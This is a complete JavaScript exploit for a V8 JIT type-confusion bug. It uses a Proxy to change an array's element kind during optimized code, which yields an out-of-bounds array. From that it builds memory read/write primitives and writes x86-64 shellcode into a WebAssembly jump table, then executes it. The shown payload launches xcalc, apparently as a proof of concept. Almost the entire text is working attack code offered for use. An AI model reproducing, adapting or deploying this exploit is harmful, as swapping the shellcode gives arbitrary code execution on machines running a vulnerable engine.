let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}

let victim_arr = new Array(15);
victim_arr[0] = 1.1; // element size is 8-byte
let oob_arr;
let tmp_obj = {};
let obj_arr;
let typed_arr;

let p = new Proxy(Object, {
    get(target, prop, receiver) {
        victim_arr[0] = {}; // element size is 4-byte
        oob_arr = [1.1];
        let dummy = []; // map will be overwritten with 0xdeadbeef
        obj_arr = [tmp_obj];
        typed_arr = new BigUint64Array(1);
        return Reflect.get(...arguments);
    }
});

function empty() { }

function f(new_target) {
    // add JSCreate to effect chain of |victim_arr|
    return victim_arr.push(Reflect.construct(empty, arguments, new_target) ? -1.1885953953532435e+148 : 0); // itof(0xdeadbeef00002000n)
}

function ff(new_target) {
    // if |f()| is outermost, |Reflect.construct()| is not be optimized to JSCreate
    // so wrap |f()| with |ff()|
    return f(new_target);
}

// generate oob array
victim_arr.pop();
victim_arr.pop();
for (let i = 0; i < 0x10000; i++) { ff(empty); victim_arr.pop(); } // trigger optimization
ff(empty);
ff(p);
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);


// get (compressed) address of `obj`
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[6]) & 0xffffffffn;
}

// get v8 base
const v8_base = (ftoi(oob_arr[22]) & 0xffffffffn) << 32n;
console.log(`[+] v8_base == ${hex(v8_base)}`);

// read 8-byte from `addr` in sandbox
function read8(addr) {
    oob_arr[21] = itof((addr & 0xffffffffn) << 32n); // lower 4 bytes of external_pointer of `typed_arr`
    oob_arr[22] = itof(addr >> 32n); // upper 4 bytes of external_pointer of `typed_arr`
    return typed_arr[0];
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    oob_arr[21] = itof((addr & 0xffffffffn) << 32n); // lower 4 bytes of external_pointer of `typed_arr`
    oob_arr[22] = itof(addr >> 32n); // upper 4 bytes of external_pointer of `typed_arr`
    typed_arr[0] = value;
}


// generate wasm module
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

// get address of jump table
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = v8_base + addrof(wasm_instance) - 1n;
// console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let jump_table_start = read8(wasm_instance_addr + 0x68n);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]; // output of shellcode.py

// overwrite backing store of arraybuffer with address of jump table
let buf = new ArrayBuffer(shellcode.length);
let buf_addr = v8_base + addrof(buf) - 1n;
// console.log(`[+] buf_addr == ${hex(buf_addr)}`);
write8(buf_addr + 0x14n, jump_table_start);

// overwrite jump table with shellcode
console.log("[+] Writing shellcode...");
let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]);
}

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
